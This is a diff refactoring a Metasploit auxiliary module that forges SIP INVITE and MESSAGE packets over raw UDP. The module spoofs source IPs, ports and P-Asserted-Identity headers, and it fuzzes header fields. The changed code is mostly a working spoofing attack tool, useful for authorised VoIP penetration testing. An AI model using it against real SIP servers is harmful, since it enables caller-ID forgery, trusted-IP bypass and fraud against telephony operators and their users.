@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 
@@ -52,18 +50,19 @@ class Metasploit3 < Msf::Auxiliary
             OptString.new('P-Charging-Vector', [false, 'Proxy Charging Field. Sample: icid-value=msanicid;msan-id=msan123;msan-pro=1 ', nil]),
             OptString.new('Record-Route', [false, 'Proxy Record-Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
             OptString.new('Route', [false, 'Proxy Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
-            OptBool.new('DEBUG',   [ false, "Verbose Level", false]),
-            OptBool.new('VERBOSE',   [ false, "Verbose Level", false]),
+            OptBool.new('DEBUG',   [ false, "Debug Level", false]),
         ], self.class)
   end
 
   def run
+    sockinfo={}
+
     thread_num=datastore['THREADS']
     src_hosts = Rex::Socket::RangeWalker.new(datastore['SRC_RHOSTS'])
     src_ports = Rex::Socket.portspec_crack(datastore['SRC_RPORTS'])
-    ip = datastore['SIP_SERVER']
-    port = datastore['SIP_PORT']
-    to = datastore['TO']
+    sockinfo["ip"] = datastore['SIP_SERVER']
+    sockinfo["port"] = datastore['SIP_PORT']
+    sockinfo["to"] = datastore['TO']
     iplst = []
 
     begin
@@ -74,6 +73,7 @@ class Metasploit3 < Msf::Auxiliary
       customheader << "Record-Route: "+datastore['Record-Route']+"\r\n" if datastore['Record-Route'] != nil
       customheader << "Route: "+datastore['Route']+"\r\n" if datastore['Route'] != nil
 
+      print_status("This modules works only under Linux!")
 
       if datastore['ACTION'] == 'MESSAGE' or datastore['ACTION'] == 'CALL'
         if datastore['FROM']
@@ -93,23 +93,25 @@ class Metasploit3 < Msf::Auxiliary
         end
 
         if datastore['P-Asserted-Identity'] == true
-          cheader = customheader+"P-Asserted-Identity: #{from}\r\n"
+          sockinfo["customheader"] = customheader+"P-Asserted-Identity: #{from}\r\n"
         else
-          cheader = customheader
+          sockinfo["customheader"] = customheader
         end
 
-        src_ip=datastore['SRC_RHOSTS']
-        src_port=datastore['SRC_RPORTS'].to_i
+        sockinfo["from"] = from
+        sockinfo["fromname"] = fromname
+        sockinfo["src_ip"] = datastore['SRC_RHOSTS']
+        sockinfo["src_port"] = datastore['SRC_RPORTS'].to_i
 
         if datastore['ACTION'] == 'CALL'
-          send_request(src_ip,src_port,ip,port,to,from,cheader,'INVITE',fromname)
+          send_request(sockinfo,'INVITE',nil)
         else
           if datastore['MESSAGE_CONTENT'] =~ /FUZZ/
             message = Rex::Text.pattern_create(datastore['MESSAGE_CONTENT'].split(" ")[1].to_i)
           else
             message = datastore['MESSAGE_CONTENT']
           end
-          send_request(src_ip,src_port,ip,port,to,from,cheader,'MESSAGE',fromname,message)
+          send_request(sockinfo,'MESSAGE',message)
         end
       else
         numip = src_hosts.num_ips
@@ -136,17 +138,20 @@ class Metasploit3 < Msf::Auxiliary
 
               src_ports.each do |src_port|
                 #Setting Spoof Options
-                from = datastore['FROM'] || src_ip+":"+src_port.to_s
-                message="Trusted IP and Port "+src_ip+":"+src_port.to_s+"\r\n"
+                sockinfo["from"] = src_ip+":"+src_port.to_s
+                message="Trusted IP and Port are "+src_ip+":"+src_port.to_s+"\r\n"
 
                 if datastore['P-Asserted-Identity'] == true
-                  cheader = customheader+"P-Asserted-Identity: "+src_ip+":"+src_port.to_s+"\r\n"
+                  sockinfo["customheader"] = customheader+"P-Asserted-Identity: "+src_ip+":"+src_port.to_s+"\r\n"
                 else
-                  cheader = customheader
+                  sockinfo["customheader"] = customheader
                 end
-                send_request(src_ip,src_port,ip,port,to,from,cheader,req_type,fromname,message)
-              end
 
+                sockinfo["src_ip"] = src_ip
+                sockinfo["src_port"] = src_port
+
+                send_request(sockinfo,req_type,message)
+              end
             end
           end
           a.map {|x| x.join }
@@ -159,43 +164,61 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def send_request(src_ip,src_port,ip,port,to,from,cheader,req_type,fromname=nil,message=nil)
-    #Assembling Packet
+  def send_request(sockinfo,req_type,message)
+    # Assembling Packet
     open_pcap
     p = PacketFu::UDPPacket.new
-    p.ip_saddr = src_ip
-    p.ip_daddr = ip
+    p.ip_saddr = sockinfo["src_ip"]
+    p.ip_daddr = sockinfo["ip"]
     p.ip_ttl = 255
-    p.udp_sport = src_port
-    p.udp_dport = port
-    p.payload=prep_req(src_ip,src_port,ip,port,to,from,cheader,req_type,fromname,message)
+    p.udp_sport = sockinfo["src_port"]
+    p.udp_dport = sockinfo["port"]
+    # Assembling Payload
+    p.payload=prep_req(sockinfo,req_type,message)
     p.recalc
 
-    #Sending Packet
+    # Sending Packet
     if datastore['SAVE_FILE']
       save_file=File.new(datastore['SAVE_FILE'], "w")
       save_file.write p.payload
       save_file.close
     end
-    ret = send(ip,p)
+
+    # Sending creates errors, PacketFU debug is required.
+    ret = send(p.ip_daddr,p)
+
     if ret == :done
-      vprint_status("#{src_ip}: Sent a packet to #{ip} from #{src_port}")
+      vprint_status("#{p.ip_saddr}: Packet sent to #{p.ip_daddr} from #{p.udp_sport}")
     else
-      print_error("#{src_ip}: Packet not sent for port #{src_port} ")
+      print_error("#{p.ip_saddr}: Packet could not sent for port #{p.udp_sport} ")
+      print_error("#{p.ip_saddr}: #{ret} ")
     end
     close_pcap
   end
 
-  def prep_req(src_addr,src_port,ip,port,to,from,cheader,req_type,fromname=nil,message=nil)
-    fromname="#{src_addr}:#{src_port}" if fromname.nil?
+  def prep_req(sockinfo,req_type,message)
+    # Setting Variables
+    src_ip = sockinfo["src_ip"]
+    src_port = sockinfo["src_port"]
+    ip = sockinfo["ip"]
+    port = sockinfo["port"]
+    to = sockinfo["to"]
+    from = sockinfo["from"]
+    cheader = sockinfo["customheader"]
+
+    if sockinfo["fromname"].nil?
+      fromname = "#{src_ip}:#{src_port}"
+    else
+      fromname = sockinfo["fromname"]
+    end
 
     #Preparing Request
     data =  "#{req_type} sip:#{to}@#{ip} SIP/2.0\r\n"
-    data += "Via: SIP/2.0/UDP #{src_addr}:#{src_port};branch=branch#{Rex::Text.rand_text_alphanumeric(10)};rport\r\n"
+    data += "Via: SIP/2.0/UDP #{src_ip}:#{src_port};branch=branch#{Rex::Text.rand_text_alphanumeric(10)};rport\r\n"
     data += "Max-Forwards: 70\r\n"
 
     if ! ( from =~ /@/ )
-      from = "#{from}@#{src_addr}"
+      from = "#{from}@#{src_ip}"
     end
     if fromname == nil
       data += "From: <sip:#{from}>\r\n"
@@ -203,14 +226,15 @@ class Metasploit3 < Msf::Auxiliary
       data += "From: \"#{fromname}\" <sip:#{from}>;tag=tag#{Rex::Text.rand_text_alphanumeric(10)}\r\n"
     end
     if datastore['FROM'] =~ /FUZZ/
-      data += "Contact: <sip:123@#{src_addr}>\r\n"
+      data += "Contact: <sip:123@#{src_ip}>\r\n"
     elsif datastore['CONTACT'] =~ /FUZZ/
-      data += "Contact: <sip:#{Rex::Text.pattern_create(datastore['CONTACT'].split(" ")[1].to_i)}@#{src_addr}>\r\n"
+      data += "Contact: <sip:#{Rex::Text.pattern_create(datastore['CONTACT'].split(" ")[1].to_i)}@#{src_ip}>\r\n"
     else
       data += "Contact: <sip:#{from}>\r\n"
     end
+
     data += "To: <sip:#{to}@#{ip}>\r\n"
-    data += "Call-ID: call#{Rex::Text.rand_text_alphanumeric(10)}@#{src_addr}\r\n"
+    data += "Call-ID: call#{Rex::Text.rand_text_alphanumeric(10)}@#{src_ip}\r\n"
     data += "CSeq: 1 #{req_type}\r\n"
     data += "User-Agent: Test Agent\r\n"
     #data += "Date: Tue, 26 Mar 2013 12:37:54 GMT\r\n"
@@ -223,9 +247,9 @@ class Metasploit3 < Msf::Auxiliary
       data += "Content-Type: application/sdp\r\n"
 
       idata = "v=0\r\n"
-      idata += "o=root 1716603896 1716603896 IN IP4 #{src_addr}\r\n"
+      idata += "o=root 1716603896 1716603896 IN IP4 #{src_ip}\r\n"
       idata += "s=Test Source\r\n"
-      idata += "c=IN IP4 #{src_addr}\r\n"
+      idata += "c=IN IP4 #{src_ip}\r\n"
       idata += "t=0 0\r\n"
       idata += "m=audio 10024 RTP/AVP 0 101\r\n"
       idata += "a=rtpmap:0 PCMU/8000\r\n"
@@ -249,7 +273,7 @@ class Metasploit3 < Msf::Auxiliary
     begin
       capture_sendto(pkt, ip)
     rescue RuntimeError => e
-      return :error
+      return e
     end
     return :done
   end
